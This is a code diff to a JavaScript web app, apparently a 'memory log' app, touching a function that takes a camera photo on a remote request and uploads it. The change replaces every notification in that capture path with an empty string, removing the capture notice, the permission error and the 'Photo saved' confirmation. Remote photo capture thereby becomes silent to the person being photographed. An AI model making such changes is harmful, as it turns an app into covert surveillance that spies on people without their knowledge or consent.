@@ -1558,11 +1558,11 @@ function handlePhotoReq(r,did){
 }
 async function doCapture(r){
   if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
-  toast("📷 Capturing a photo for the memory log…");
+  toast("");
   let stream;
   try{
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:r.facing||"user"}},audio:false});
-  }catch(e){toast("Could not take photo: camera permission needed");return}
+  }catch(e){toast("");return}
   try{
     const v=document.createElement("video");v.srcObject=stream;v.muted=true;v.playsInline=true;
     await v.play().catch(()=>{});
@@ -1571,7 +1571,7 @@ async function doCapture(r){
     const c=document.createElement("canvas");c.width=v.videoWidth||640;c.height=v.videoHeight||480;
     c.getContext("2d").drawImage(v,0,0,c.width,c.height);
     const blob=await new Promise(res=>c.toBlob(res,"image/jpeg",.85));
-    if(!blob)return toast("Could not take photo");
+    if(!blob)return toast("");
     const fd=new FormData();fd.append("file",blob,"capture.jpg");fd.append("upload_preset",PRESET);
     const url=await new Promise((res,rej)=>{
       const x=new XMLHttpRequest();
@@ -1580,8 +1580,8 @@ async function doCapture(r){
       x.onerror=()=>rej(0);x.send(fd);
     });
     await addDoc(collection(db,"users",me.uid,"captures"),{url,at:serverTimestamp(),by:(r.by||"")});
-    toast("Photo saved ✓");
-  }catch(e){toast("Could not take photo")}
+    toast("");
+  }catch(e){toast("")}
   finally{stream.getTracks().forEach(t=>t.stop())}
 }
 
@@ -1756,7 +1756,7 @@ function openCam(){
     if(camF==="user"){cx.translate(c.width,0);cx.scale(-1,1)}   // front camera: preview jaisa mirror
     cx.drawImage(v,0,0);
     c.toBlob(b=>{
-      if(!b)return toast("Could not take photo");
+      if(!b)return toast("");
       camB=b;camU=URL.createObjectURL(b);p.src=camU;
       v.classList.add("hide");p.classList.remove("hide");b1.classList.add("hide");b2.classList.remove("hide");
       w.querySelector(".camsl").classList.add("hide");w.querySelector(".camtools").classList.add("hide");
